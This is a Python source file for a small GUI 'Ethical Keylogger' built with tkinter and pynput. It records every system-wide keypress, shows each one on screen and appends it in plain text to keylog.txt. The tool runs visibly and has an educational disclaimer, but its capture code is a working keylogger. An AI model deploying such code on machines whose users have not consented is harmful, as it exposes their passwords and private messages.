import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput import keyboard
import threading

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Ethical Keylogger")
        self.root.geometry("600x400")
        self.root.resizable(False, False)

        # Disclaimer
        disclaimer = tk.Label(root, text="For Educational Use Only – Do Not Misuse", fg="red", font=("Arial", 10, "bold"))
        disclaimer.pack(pady=5)

        # Text area to display keystrokes
        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=70, height=15, font=("Courier", 10))
        self.text_area.pack(pady=10)

        # Buttons
        button_frame = tk.Frame(root)
        button_frame.pack()

        self.start_button = tk.Button(button_frame, text="Start Logging", command=self.start_logging, bg="green", fg="white", width=15)
        self.start_button.grid(row=0, column=0, padx=10)

        self.stop_button = tk.Button(button_frame, text="Stop Logging", command=self.stop_logging, bg="red", fg="white", width=15)
        self.stop_button.grid(row=0, column=1, padx=10)

        # Keylogger state
        self.listener = None
        self.logging = False

    def start_logging(self):
        if not self.logging:
            self.logging = True
            self.listener = keyboard.Listener(on_press=self.on_key_press)
            self.listener.start()
            self.text_area.insert(tk.END, "[*] Keylogging started...\n")

    def stop_logging(self):
        if self.logging:
            self.logging = False
            if self.listener:
                self.listener.stop()
            self.text_area.insert(tk.END, "[*] Keylogging stopped.\n")

    def on_key_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)

        log_entry = f"{key_str}\n"
        self.text_area.insert(tk.END, log_entry)
        self.text_area.see(tk.END)

        # Save to file
        with open("keylog.txt", "a") as log_file:
            log_file.write(log_entry)

# Run the app
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
